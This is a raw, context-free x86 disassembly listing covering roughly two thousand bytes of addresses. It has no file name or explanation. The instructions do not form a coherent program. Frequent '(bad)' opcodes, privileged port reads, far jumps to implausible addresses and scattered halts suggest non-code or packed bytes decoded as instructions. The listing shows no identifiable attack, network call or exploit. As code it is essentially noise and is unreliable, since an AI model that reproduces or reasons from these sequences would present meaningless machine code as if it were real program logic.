  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
